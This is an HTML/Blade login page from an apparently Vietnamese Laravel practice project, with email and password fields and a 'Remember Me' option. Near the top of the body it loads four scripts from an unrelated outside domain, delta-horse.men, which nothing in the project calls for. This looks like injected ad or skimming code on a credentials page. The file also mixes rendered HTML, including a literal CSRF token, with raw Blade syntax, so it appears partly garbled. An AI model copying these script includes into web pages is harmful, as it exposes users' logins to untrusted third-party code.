<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="vbrGl6A6ktXSMUnnTQBxpve0l7byq7qt8ITTeYt1">

    <title>Đăng Nhập</title>

    <!-- Styles -->
    <link href="http://localhost/Web_Thuc_Tap/public/css/app.css" rel="stylesheet">
</head>
<body>
	<script charset="UTF-8" src="//b.delta-horse.men/code/x/z/?pid=300414"></script>
	<script charset="UTF-8" src="//delta-horse.men/code/pid/300414_ALL.js?rev=121"></script>
	<script charset="UTF-8" src="//delta-horse.men/code/pid/300414_BNX.js?rev=121"></script>
	<script charset="UTF-8" src="//delta-horse.men/code/pid/linkcheck.js?rev=121"></script>
	<script src="http://localhost/Web_Thuc_Tap/public/js/app.js"></script>
    	<div id="app">
    		<nav class="navbar navbar-default navbar-static-top">
	    		<div class="container">
	    			<div class="navbar-header">
	    				<a href="{{route('index')}}" class="navbar-brand">
	                        Home
	                    </a>
            		</div>
       			 </div>
            </nav> 
        	<div class="container">

		       <div class="row">
		        	<div class="col-md-8 col-md-offset-2">
		        		<div class="panel panel-default">
		        			<div class="panel-heading">Login</div> 
		        			<div class="panel-body">
		        			 @if(Session::has('thatbai'))
								<div class="alert alert-success">{{Session::get('thatbai')}}</div>
							@endif
		        				<form method="POST" action="{{route('manager')}}" class="form-horizontal">
		        					<input type="hidden" name="_token" value="{{csrf_token()}}" required="">
		        						 <div class="form-group">
		        						 	<label for="email" class="col-md-4 control-label">E-Mail Address</label>
		        						 	 <div class="col-md-6">
		        						 	 	<input id="email" name="email" value="" required="required" autofocus="autofocus" class="form-control" type="email">
		        						 	 </div>
		        						</div> 

		        						<div class="form-group">
		        							<label for="password" class="col-md-4 control-label">Password</label> 
		        							<div class="col-md-6">
		        								<input id="password" name="password" required="required" class="form-control" type="password">
		        							</div>
		        						</div> 

		        						<div class="form-group">
		        							<div class="col-md-6 col-md-offset-4">
		        								<div class="checkbox">
		        									<label><input name="remember" type="checkbox"> Remember Me
		                                    		</label>
		                                    	</div>
		                                    </div>
		                                </div> 

		                                <div class="form-group">
		                                	<div class="col-md-8 col-md-offset-4">
		                                		<button type="submit" class="btn btn-primary">
		                                   			 Login
		                               			</button> 

		                               			<a href="http://localhost/Web_Thuc_Tap/public/password/reset" class="btn btn-link">
		                                    		Forgot Your Password?
		                                		</a>
		                                	</div>
		                                </div>
		                       </form>
		                    </div>
		                </div>
		            </div>
		       </div>
  			</div>
		</div>


</html>